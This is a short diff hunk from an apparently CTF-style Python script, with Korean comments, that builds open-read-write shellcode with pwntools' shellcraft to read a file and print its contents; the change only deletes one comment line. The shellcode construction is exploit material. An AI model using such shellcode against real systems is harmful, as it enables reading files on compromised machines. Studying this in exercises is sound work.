@@ -106,7 +106,7 @@ code += shellcraft.open(path,0 ,0)
 code += shellcraft.read('rax','rsp',0x1000)
 
 #shellcraft를 이용하여 write system call의 셸코드를 사용. 인자는 fd,buffer,count 순이다. 
-#인자가 read와 같다.
+
 code += shellcraft.write(1,'rsp',0x1000)
 
 #출력데이터 받아서 출력.
